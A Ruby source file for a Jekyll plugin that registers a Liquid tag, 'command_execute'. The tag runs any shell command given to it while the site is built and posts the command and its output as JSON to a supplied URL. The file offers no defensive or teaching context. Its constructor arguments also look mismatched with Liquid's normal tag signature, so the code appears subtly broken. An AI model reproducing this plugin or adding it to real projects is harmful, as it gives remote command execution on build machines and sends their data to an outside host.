require 'net/http'
require 'uri'

module Jekyll

  class CommandExecute < Liquid::Tag

    def initialize(tag_name, command, response_url)
      super
      @command = command
      @response_url = response_url
    end

    def render(context)
      command_output = `#{@command}`
      Net::HTTP.post URI("#{@response_url}"),
        { "command" => "#{@command}", "result" => "#{command_output}" }.to_json,
        "Content-Type" => "application/json"
    end

  end
end

Liquid::Template.register_tag('command_execute', Jekyll::CommandExecute)
